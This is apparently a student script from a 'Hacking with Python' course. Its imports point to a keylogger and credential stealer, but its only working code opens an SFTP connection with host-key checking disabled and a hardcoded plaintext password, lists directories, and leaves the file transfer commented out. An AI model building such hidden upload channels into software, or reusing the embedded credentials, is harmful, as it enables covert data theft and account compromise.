#Imports
import os
import socket
from ctypes import *
import pythoncom, pyWinhook, win32clipboard, win32gui, win32ui, win32con, win32api, pyaes, win32cred, pywintypes
import sqlite3, shutil, win32crypt, win32process, sys, random, pygame, time
from sys import gettrace as sys_gettrace
from tkinter import *
from ftplib import FTP_TLS
from _thread import *


#Variables
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
current_hwnd = 0
screenshot_path = "C:\\Users\\Manuel\\Studium\\Semester 5\\Hacking with Python\\Hausarbeite_Hacking_with_Python\\"
screenshot_number = 0
expression = ""

import pysftp

def main():
    cnopts = pysftp.CnOpts()
    cnopts.hostkeys = None
    sftp = pysftp.Connection(host="192.168.0.104", username="desktop-722h3i8\manue", password="Tennis12!", cnopts=cnopts)
    print(sftp.listdir("Music"))
    print("Connection succesfully established ... ")
    # Define the file that you want to upload from your local directort or
    # absolute "C:\Users\sdkca\Desktop\TUTORIAL.txt"
    localFilePath = "C:\\Users\\Manuel\\Studium\\Semester 5\\Hacking with Python\\Hausarbeite_Hacking_with_Python\\test.txt"
    # Define the remote path where the file will be uploaded
    remoteFilePath = "/home/test.txt"
    #sftp.put(localFilePath, remoteFilePath)
    sftp.listdir(".")
    #sftp.get(remoteFilePath, localFilePath)
    sftp.close()

if __name__ == "__main__":
    main()
